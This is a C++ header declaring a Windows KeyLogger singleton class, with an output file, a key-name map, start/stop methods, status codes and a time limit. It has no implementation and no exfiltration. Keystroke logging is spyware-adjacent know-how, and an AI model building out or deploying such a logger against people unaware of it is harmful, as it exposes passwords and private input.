#include <iostream>
#include <windows.h>
#include <string>
#include <unordered_map>
#include <fstream>
#include <time.h>
#include <atomic>

#define KL_PRESSED 1
#define KL_WAITING 0
#define KL_RUNNING 1
#define KL_FINISHED 2

class KeyLogger {
	private:
		std::string file_name;
		static std::unordered_map<int, std::string> vkey;
		bool getSpecialKey(int key, std::string& key_name);
		void keylog();
		std::atomic<bool> running;
		const int max_running_time = 300;
		std::atomic<int> status;

		// for singleton
		KeyLogger() = delete;
		KeyLogger(const std::string& file_name) : file_name(file_name), status(KL_WAITING), running(false) {}
		KeyLogger(const KeyLogger& kl) = delete;
		KeyLogger& operator=(const KeyLogger& kl) = delete;
		static KeyLogger* instance;

	public:
		static KeyLogger* getInstance(const std::string& file_name = "");
		static void deleteInstance();
		void start() {running = true; keylog();}
		void stop() {running = false;}
		std::string getOutputFile();
		int getStatus();
};